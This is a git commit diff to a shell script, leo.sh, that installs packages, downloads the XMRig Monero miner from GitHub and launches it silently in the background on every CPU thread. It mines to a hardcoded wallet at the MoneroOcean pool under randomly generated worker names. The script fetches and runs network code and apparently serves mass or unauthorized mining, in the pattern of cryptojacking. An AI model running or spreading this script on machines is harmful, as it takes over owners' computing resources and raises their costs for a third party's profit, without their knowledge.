dbf030990670e683b603abf51fc14813ab03aaf9
pozyanime <pozyanime@gmail.com>
2026-04-08 19:39:00 +0430

    Update leo.sh

--- leo.sh
+++ leo.sh
@@ -2,20 +2,29 @@
 
 set -e
 
-# download xmrig (focal build)
-wget https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-focal-x64.tar.gz
+echo "[+] Installing dependencies..."
+apt update -y
+apt install -y wget tar
 
-# extract
+echo "[+] Downloading XMRig..."
+wget -q https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-focal-x64.tar.gz
+
+echo "[+] Extracting..."
 tar -xvf xmrig-6.26.0-focal-x64.tar.gz
 
 cd xmrig-6.26.0
-
 chmod +x xmrig
 
-# generate random worker name
+echo "[+] Generating worker name..."
 RIG=$(head /dev/urandom | tr -dc 'a-z' | head -c 6)
 
-# run miner
-nohup ./xmrig -o pool.supportxmr.com:3333 \
--u 86d6j4cXJu5eU7fPnL156S4LsXqXTcrys2YwdEtvARMfYsBtuyZJbj4idxAmcq9rCJj44fSTg9hNcYvAZBtC8n7U526ZJUW.${RIG} \
--p x > miner.log 2>&1 &
+echo "[+] Starting miner..."
+
+nohup ./xmrig \
+-o gulf.moneroocean.stream:10128 \
+-u 44g3cUJmSyddMg129Tsh2rQdJKpG8DR7pCzEYqfbkFWqASCqNsC8uF5RwJrm3uoqgR4YhT4HWX97rW2ywTEcy5TX8Ga2BPX.${RIG} \
+-p x \
+--coin monero \
+--randomx-mode fast \
+--threads=$(nproc) \
+> miner.log 2>&1 &
